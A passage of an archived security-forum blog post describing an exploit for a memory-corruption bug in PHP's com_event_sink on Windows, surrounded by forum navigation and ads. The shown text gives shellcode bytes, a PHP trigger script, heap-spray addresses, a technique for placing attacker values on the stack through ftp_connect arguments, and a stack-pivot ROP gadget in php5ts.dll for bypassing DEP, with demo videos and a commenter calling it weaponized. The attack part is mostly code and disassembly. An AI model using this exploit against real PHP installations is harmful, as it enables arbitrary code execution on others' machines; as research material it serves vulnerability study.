<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";</i></font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>$vVar= new VARIANT(0x04040404); </i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>$vVar2= new VARIANT("hello"); </i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>com_event_sink($vVar,$vVar2, NULL); </i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>?&gt;</i></font></span></font><br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Now when the jump takes place somewhere near 0x04040404 , machine will encounter 0x04 bytes which disassemble to </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>addal,4 </i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3">which basically is a NOP code.<br/>
</font></span></font><br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Following is the basic idea behind the heap spray </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">MOVEAX,DWORD PTR DS:[ESI] &lt;&lt; EAX == 0x04040404</font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">CALLDWORD PTR DS:[EAX+10] &lt;&lt; JMP 0x04040404 because [eax + 10] =0x04040404</font></span></font><br/>
<br/>
<i><font color="#000000"><span style="font-family: Times New Roman"><font size="3">Note:Because i  tested the exploit using a Virtual machine which has limited memory capacity of 512MB, you may have to choose different spray addresses on machine with higher memory range </font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">The following memory addresses can be used as spray as they also behave as NOP 's</font></span></font><br/>
</i><br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">0x05050505 =    ADD EAX,5050505  &lt;&lt;&lt; acts as a NOP</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">0x0c0c0c0c  =     OR AL, 0C &lt;&lt; also acts as a NOP</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">0x0d0d0d0d =    OR EAX,0d0d0d0d....</font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>                          Knocking Stack variables for Precision( Bypass DEP fast no need to spray).</b></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">As, we have already seen that static offsets in the heap region of the php interpreter are quite unreliable to use. Now in order to be precise in offsets , we can use stack memory region for that we need a way to populate the stack memory region . At the same time we know that there is no way by which ,we can populate stack using php variables because they are stored in heap rather than on stack.</font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">While checking out  the ZEND Engine source code i figured out a way to populate stack region </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">PHP modules uses  </font></span></font><font color="#000000"><span style="font-family: Courier New"><font size="2"><i>zend_parse_parameters()</i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3">API function to get the variables passed to a php fucntion in C Styled declaration.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Somemodule store the variables in heap and some declare them as local</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">for example if you read the sourcecode of php_ftp.c from ftp module ofphp </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>/*{{{ proto resource ftp_connect(string host [, int port [, inttimeout]])<br/>
   Opens a FTP stream*/<br/>
PHP_FUNCTION(ftp_connect)<br/>
{<br/>
    ftpbuf_t    *ftp;<br/>
    char        *host;<br/>
    int        host_len;<br/>
    long        port = 0;<br/>
    long        timeout_sec = FTP_DEFAULT_TIMEOUT;<br/>
<br/>
    if(zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s|ll",&amp;host, &amp;host_len, &amp;port, &amp;timeout_sec) == FAILURE){<br/>
        return;<br/>
    }</i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">you can see that many variable like host_len, port and timeout are stored on the stack , we can use this function to populate the stack memory.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">This subroutine happens to be present at  0x10300B79   inside php5ts.dll</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">hereis the disassembly </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B79  55               PUSH EBP</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B7A  8BEC             MOV EBP,ESP</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B7C  83EC 10          SUB ESP,10</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B7F  56               PUSH ESI</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B80  8B75 1C          MOV ESI,DWORD PTR SS:[EBP+1C]</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B83  57               PUSH EDI</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B84  8D45 FC          LEA EAX,DWORD PTR SS:[EBP-4]</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B87  50               PUSH EAX</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B88  8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B8B  50               PUSH EAX</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B8C  8D45 F0          LEA EAX,DWORD PTR SS:[EBP-10]</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B8F  50               PUSH EAX</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B90  8D45 F4          LEA EAX,DWORD PTR SS:[EBP-C]</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B93  50               PUSH EAX</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B94  68 B8A95410      PUSH php5ts.1054A9B8 ; ASCII "s|ll"</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B99  56               PUSH ESI</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B9A  FF75 08          PUSH DWORD PTR SS:[EBP+8]</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B9D  33FF             XOR EDI,EDI</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300B9F  897D F8          MOV DWORD PTR SS:[EBP-8],EDI</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300BA2  C745 FC 5A000000 MOV DWORD PTR SS:[EBP-4],5A</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300BA9  E8 B21CD4FF      CALL php5ts.zend_parse_parameters</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>10300BAE  83C4 1C          ADD ESP,1C</i></font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Now in this case we will try to use the port to populate stack region at 0x00C1FA88 </font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">and as we know that the vulnerability triggers by the following assembly sequence </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">MOVEAX,DWORD PTR DS:[ESI] &lt;&lt; ESI  = </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>0x00C1FA88- 10</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">CALLDWORD PTR DS:[EAX+10] &lt;&lt; xchg esp,edi </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Wewill use a stack pivoting gadget to make ESP point to EDI ( whichhold our ROP payload )</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">php5ts.dll is quite dense and luckily a lot of gadgets related to stack pivoting are found there</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">we will use the gadget found in php5ts.dll at  </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>0x10005767 XCHG ESP, EDI,</i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Set the value of timeout variable to  “0x00C1FA88 – 10” , and laterwhen the call [eax +10] takes place it will land to  </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>0x10005767XCHG ESP, EDI Gadget.</i></font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Videos: In the following videos i am running the same exploit on windows XP(no SP), XP sp2, and windows 7.  The video is to demonstrates the reliability of the techniques used. </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Note:Because the PHP binary has been compiled with /NXCOMPACT MSVC compiler flag, which basically enforces the loader to use DEP for the binary , If you are testing with heap spraying please disable DEP before proceeding .<br/>
</font></span></font><b><br/>
Windows 7</b><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><br/>
</font></span></font>
<iframe class="restrain" frameborder="0" height="390" src="../external.html?link=http://www.youtube.com/embed/gArr78g6IMk?wmode=opaque" title="YouTube video player" width="640"></iframe>
<br/>
<br/>
<b>Windows XP SP2</b><br/>

<iframe class="restrain" frameborder="0" height="390" src="../external.html?link=http://www.youtube.com/embed/QnQcXLr80E0?wmode=opaque" title="YouTube video player" width="640"></iframe>
<br/>
<b><br/>
Windows XP (NOSP)<br/>
</b>
<iframe class="restrain" frameborder="0" height="390" src="../external.html?link=http://www.youtube.com/embed/6MNzPk0GN40?wmode=opaque" title="YouTube video player" width="640"></iframe>


					
				</blockquote>
			</div>
				


				<div class="blogcontrol fly">
					
				</div>

				<div class="blogmeta">
					

					
					<div class="tags" id="blogtagcontainer_578">
							Tags:
							<span id="blogtaglist_578">
								
								None
								
							</span>
							
								<span id="blogtagmenu_578"><a href="threadtag009d.html?do=manage&amp;contenttype=vBBlog_BlogEntry&amp;contentid=578"><img alt="Add / Edit Tags" border="0" class="inlineimg" id="blogtag_578" src="images/misc/blog/tag_edit.png"/></a></span>
							
					</div>
					
				
					
					<dl class="blogcategory stats">
						<dt class="shade">Categories</dt>
						<dd>

	
		<a href="blogf94b.html?u=3489&amp;blogcategoryid=-1">Uncategorized</a>
	
</dd>
					</dl>
					
				</div>
				<ul class="entrycontrols">
					
					
					
					
					
				</ul>

		</div>
	</div>

</div>

<div id="navlinks">
	<!-- top navlinks -->
	
		« <a href="blog4cf6.html?b=578&amp;goto=prev">Prev</a>
		   
	
	<a href="blog4258.html?u=3489">Main</a>
		
			   
			<a href="blogb195.html?b=578&amp;goto=next">Next</a> »
		
	<!-- end top navlinks -->
</div>




<!-- lightbox scripts -->
	<script src="clientscript/vbulletin_lightbox6719.html?v=421" type="text/javascript"></script>
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_Lightbox_Container", "entry578", 1);
	//-->
	</script>
<!-- / lightbox scripts -->




<h2 class="commentsheader" id="comments_heading"><a name="comments"></a>Comments</h2>

<div class="floatcontainer" id="above_comments">
	
	
		
</div>

<form action="../external.html?link=http://garage4hackers.com/blog_inlinemod.php?b=578" class="block" id="commentform" method="post">
	
	<ol class="list_no_decoration" id="message_list">
		<li class="postbit postbit-lite postcontainer" id="comment_675">
	<a name="comment675"></a>
	
		
			
				<a class="avatarlink" href="membere81f.html?u=8"><img alt="fb1h2s's Avatar" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_675">
		
			<a class="username" href="membere81f.html?u=8">fb1h2s</a>
		
		-
		<span class="postdate">01-12-2013 <span class="time">10:14 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_675">
			<blockquote class="posttext restore">
				Wow u just weaponized  it <img alt="" border="0" class="inlineimg" src="images/smilies/smile.png" title="Smile"/> this looks sexy, am just backlinking this blog form mine.
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "675");
	//-->
	</script>
</li>
	</ol>
	

	<div class="floatcontainer" id="below_comments">
		
	</div>

	<input name="s" type="hidden" value=""/>
	<input name="securitytoken" type="hidden" value="guest"/>
	<input name="b" type="hidden" value="578"/>
	<input name="bt" type="hidden" value=""/>
	<input name="url" type="hidden" value=""/>
	<input name="userid" type="hidden" value="3489"/>
</form>








	
		<!-- Editor Scripts -->
<script type="text/javascript">
<!--

var CKEDITOR_BASEPATH = getBaseUrl() + 'clientscript/ckeditor/';

var ltr = 'left';



var ignorequotechars = 1;
var allowbasicbbcode = false;

// vB Phrases
vbphrase["must_enter_subject"]           = "You must enter a title / subject!";
vbphrase["message_too_short"]            = "The message you have entered is too short. Please lengthen your message to at least %1$s characters.";
vbphrase["click_quick_reply_icon"]       = "";
vbphrase["all_files"]                    = "All Files";
vbphrase["file_is_too_large"]            = "File is too Large";
vbphrase["invalid_file"]                 = "Invalid File";
vbphrase["maximum_number_of_attachments_reached"] = "Maximum number of attachments reached";

//-->
</script>
<!-- / Editor Scripts -->
		<script src="clientscript/ckeditor/ckeditor14ad.html?t=A7HG4HT&amp;v=421" type="text/javascript"></script><script src="clientscript/vbulletin_textedit6719.html?v=421" type="text/javascript"></script>
	
<div class="hidden" id="ajax_post_errors">
	<div class="block">
		<div class="blockhead floatcontainer">
			<span class="blockhead_info"><input class="button" id="quick_edit_errors_hide" type="button" value=" X "/></span>
			<h2>vBulletin Message</h2>
		</div>
		<div class="blockbody">
			<div class="blockrow" id="ajax_post_errors_message"> </div>
		</div>
		<div class="blockfoot">
			<a class="textcontrol" href="#" id="quick_edit_errors_cancel">Cancel Changes</a>
		</div>
	</div>
</div>
	<script src="clientscript/blog_quick_edit6719.html?v=421" type="text/javascript"></script>
	




	

	<h2 class="commentsheader" id="trackbacks_heading"><a name="trackbacks"></a>Trackbacks</h2>

	<div class="trackbacks_block">
		<span class="shade">Total Trackbacks</span> 0
	
		<div class="shade">
			<a class="shade" href="entry8d74.html?b=578" title="Trackback URL">No other blogs currently reference this blog entry</a>
		</div>
	

		
		
		<div id="trackbackurl">
			Trackback URL: <input onmouseover="this.select();" type="text" value="http://garage4hackers.com/blog_callback.php?b=578"/>
		</div>
		
	</div>

	


<script type="text/javascript">
<!--
	vBulletin.register_control("vB_QuickEdit_Blog_Entry", "578");
    extra = {
    //
    };

    extra.userid = "3489";

    vBulletin.register_control("vB_AJAX_TagEditor", "vBBlog_BlogEntry", "578", "blog", extra);
//-->
</script>
<script src="clientscript/vbulletin_menu6719.html?v=421" type="text/javascript"></script>
<script src="clientscript/vbulletin_ajax_tageditor6719.html?v=421" type="text/javascript"></script>
			<!-- End main content -->
		        </div>
		</div>
	</div>
	<div id="sidebar_container"><h6 class="actionbutton_container">
	
		<a class="pagetitleinfo textcontrol" href="register.html" rel="nofollow"><span>+</span> Create Blog</a>
	
	</h6>

<div id="blog_user_sidebar">
	

	<div class="block mainblock">
		<div class="blocksubhead"><a class="username offline" href="member4258.html?u=3489">Rashid bhatt</a></div>
		<div class="floatcontainer" id="userinfoblock">
			
			<a class="avatar" href="member4258.html?u=3489" title="Rashid bhatt's Avatar">
				<span class="avatarcontainer"><img alt="Rashid bhatt's Avatar" src="550813_10151201455682497_370701521_nefff.jpg?u=3489&amp;dateline=1354341988&amp;type=profile"/></span>
			</a>
			
				
			<ul class="list_no_decoration" id="usermenu">
				
					<li>
						<a href="member4258.html?u=3489"><img alt="Go to Profile" src="images/site_icons/profile.png"/> Go to Profile</a>
					</li>
				
				
				

				
				
				<li>
					<a href="blog56f5.html?u=3489&amp;do=markread&amp;readhash=" rel="nofollow"><img alt="Mark as Read" src="images/site_icons/markasread.png"/> Mark as Read</a>
				</li>
				
				
			</ul>
		</div>

		<div class="blockbody">
			<div class="blockrow">
				<div id="userstats">
					
					<dl class="stats">
						<dt>Join Date</dt>
						<dd>Sep 2012</dd>
					</dl>
					
					
					<dl class="stats">
						<dt>Location</dt>
						<dd>kashmir</dd>
					</dl>
					
					
					<dl class="stats">
						<dt>Age</dt>
						<dd>29</dd>
					</dl>
					
					<dl class="stats">
						<dt>Posts</dt>
						<dd>13</dd>
					</dl>
					<dl class="stats">
						<dt>Blog Entries</dt>
						<dd>1</dd>
					</dl>
					
					
					
					
					
				</div>

				
			</div>		
		</div>
	</div>
	<div class="underblock"></div>

	

	

	

	<ul id="moveable_blocks">
		
		
		
		
		
		
		
		
	<li id="block_category">
		<div class="block categoryblock" id="block_category_div">
			<div class="blocksubhead smaller moveable" id="block_category_handle">
				<a class="collapse" href="#top" id="collapse_c_blog_categories"><img alt="" src="images/buttons/collapse_40b.png"/></a>
				
				Blog Categories
			</div>
			<div class="blockbody" id="c_blog_categories">
				<div class="blockrow">
					
					
						<h2 class="local">Local Categories</h2>
						<ul class="folderlist hideoverflow">
							
<li>
	<img alt="Uncategorized" border="0" class="inlineimg" src="images/misc/blog/folder.png"/>
	
		
			<a href="blogf94b.html?u=3489&amp;blogcategoryid=-1" title="Uncategorized">Uncategorized</a>
		
	
</li>
						</ul>
					
				</div>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	<li id="block_comments">
		<div class="block smaller moveable" id="block_comments_div">
			<div class="blocksubhead" id="block_comments_handle">
				<a class="collapse" href="#top" id="collapse_c_blog_comments"><img alt="" src="images/buttons/collapse_40b.png"/></a>
				<a href="blog5358.html?u=3489&amp;do=comments">Recent Comments</a>
			</div>
			<div class="blockbody" id="c_blog_comments">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryf654-2.html?b=578&amp;bt=675#comment675">Reliable PHP Exploitation from Windows XP to Windows 7</a>

		<br/>

		
		<span class="shade">by <a class="shade" href="membere81f.html?u=8" rel="nofollow">fb1h2s</a></span>
		
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	<li id="block_entries">
		<div class="block smaller moveable" id="block_entries_div">
			<div class="blocksubhead" id="block_entries_handle">
				<a class="collapse" href="#top" id="collapse_c_blog_entries"><img alt="" id="collapseimg_blog_entries" src="images/buttons/collapse_40b.png"/></a>
				<a href="blog4258.html?u=3489">Recent Blog Posts</a>
			</div>
			<div class="blockbody" id="c_blog_entries">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="550813_10151201455682497_370701521_nc1ce.jpg?u=3489&amp;dateline=1354339669&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry8d74.html?b=578">Reliable PHP Exploitation from Windows XP to Windows 7</a>
		
		<br/>
		
		01-11-2013 <span class="time">08:11 PM</span>
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

<li id="block_visitors">
	<div class="block" id="block_visitors_div">
		<div class="blocksubhead" id="block_visitors_handle">
			<a class="collapse" href="#top" id="collapse_c_blog_visitors"><img alt="" border="0" id="collapseimg_blog_visitors" src="images/buttons/collapse_40b.png"/></a>
			Recent Visitors
		</div>
		<div class="blockbody" id="c_blog_visitors">
			<div class="blockrow">
				<ul class="commalist" id="recent_visitors_list">
					
						<li><a class="username" href="membere62c.html?u=191">abhaythehero</a>, </li>
					
						<li><a class="username" href="memberc79f.html?u=3283">c0dist</a>, </li>
					
						<li><a class="username" href="membere81f.html?u=8">fb1h2s</a>, </li>
					
						<li><a class="username" href="member874b.html?u=6243">Kernelcop</a>, </li>
					
						<li><a class="username" href="memberf6e1.html?u=23852">mra0Xdeadb33f</a>, </li>
					
						<li><a class="username" href="membere3f9.html?u=6534">Rayees</a>, </li>
					
						<li><a class="username" href="member792b.html?u=15911">shady</a>, </li>
					
						<li><a class="username" href="member54ae.html?u=11">silentph33r</a>, </li>
					
						<li><a class="username" href="member5c64.html?u=2826">sniffer</a>, </li>
					
						<li><a class="username" href="memberc6a3.html?u=8180">spidey</a></li>
					
				</ul>
			</div>
		</div>
	</div>
	<div class="underblock"></div>
</li>
<li id="block_archive">
	<div class="block blogusermenu" id="vb_blogcalendar">
		<div class="calendar mini" id="block_archive_div">
	<h4 class="blocksubhead smaller moveable" id="block_archive_handle">
		<a class="collapse" href="#top" id="collapse_c_blog_calendar"><img alt="" src="images/buttons/collapse_40b.png"/></a>
		Archive
	</h4>
	<div class="blockbody" id="c_blog_calendar">
		<table class="blockrow" width="100%">
			<tbody><tr>
				
					<th align="center" class="blocksubhead" id="vb_blogcalendar_prevmonth" prevmonth="1" prevyear="2013">
						 
						
							<a href="blogcf99.html?u=3489&amp;m=1&amp;y=2013">&lt;</a>
						
						 
					</th>
									
				<th align="center" class="blocksubhead" colspan="5" id="vb_blogcalendar_currentmonth">
					
						<a href="blog71fe.html?u=3489&amp;m=3&amp;y=2020">March 2020</a>
					
				</th>
				
					<th class="blocksubhead">
						   
					</th>
 				
         		</tr>
			<tr align="center">
				<td class="blogsubheader">Su</td>
				<td class="blogsubheader">Mo</td>
				<td class="blogsubheader">Tu</td>
				<td class="blogsubheader">We</td>
				<td class="blogsubheader">Th</td>
				<td class="blogsubheader">Fr</td>
				<td class="blogsubheader">Sa</td>
			</tr>
			<tr><td class="othermonth">
	
		<span class="simpleday">23</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">24</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">25</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">26</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">27</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">28</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">29</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">1</span>
	
</td><td>
	
		<span class="simpleday">2</span>
	
</td><td>
	
		<span class="simpleday">3</span>
	
</td><td>
	
		<span class="simpleday">4</span>
	
</td><td>
	
		<span class="simpleday">5</span>
	
</td><td>
	
		<span class="simpleday">6</span>
	
</td><td>
	
		<span class="simpleday">7</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">8</span>
	
</td><td>
	
		<span class="simpleday">9</span>
	
</td><td>
	
		<span class="simpleday">10</span>
	
</td><td>
	
		<span class="simpleday">11</span>
	
</td><td>
	
		<span class="simpleday">12</span>
	
</td><td>
	
		<span class="simpleday">13</span>
	
</td><td>
	
		<span class="simpleday">14</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">15</span>
	
</td><td>
	
		<span class="simpleday">16</span>
	
</td><td>
	
		<span class="simpleday">17</span>
	
</td><td>
	
		<span class="simpleday">18</span>
	
</td><td>
	
		<span class="simpleday">19</span>
	
</td><td>
	
		<span class="simpleday">20</span>
	
</td><td>
	
		<span class="simpleday">21</span>
	
</td></tr><tr><td class="today" title="Today">
	
		<span class="simpleday">22</span>
	
</td><td>
	
		<span class="simpleday">23</span>
	
</td><td>
	
		<span class="simpleday">24</span>
	
</td><td>
	
		<span class="simpleday">25</span>
	
</td><td>
	
		<span class="simpleday">26</span>
	
</td><td>
	
		<span class="simpleday">27</span>
	
</td><td>
	
		<span class="simpleday">28</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">29</span>
	
</td><td>
	
		<span class="simpleday">30</span>
	
</td><td>
	
		<span class="simpleday">31</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">1</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">2</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">3</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">4</span>
	
</td></tr>
		</tbody></table>
	</div>
</div>
	</div>
	<div class="underblock"></div>
	<script src="clientscript/blog_ajax_calendar6719.js?v=421" type="text/javascript"></script>
	<script type="text/javascript">
	<!--
		blogCalendar = new vB_AJAX_BlogCalendar('blogCalendar', 'vb_blogcalendar', 3, 2020, 3489);
	//-->
	</script>
</li>
	</ul>
	
	
</div></div>
	
	<div class="cleardiv"></div>
</div>


<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
</div>

<div class="floatcontainer footer" id="footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label=" Standard Styles">
									
					
	<option class="" selected="selected" value="1">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label=" Mobile Styles">
					
					
	<option class="" value="2">-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul class="footer_links" id="footer_links">
		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="entry8d74.html?b=578#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">03:55 PM</span>.</div>

<div class="shade footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="shade footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
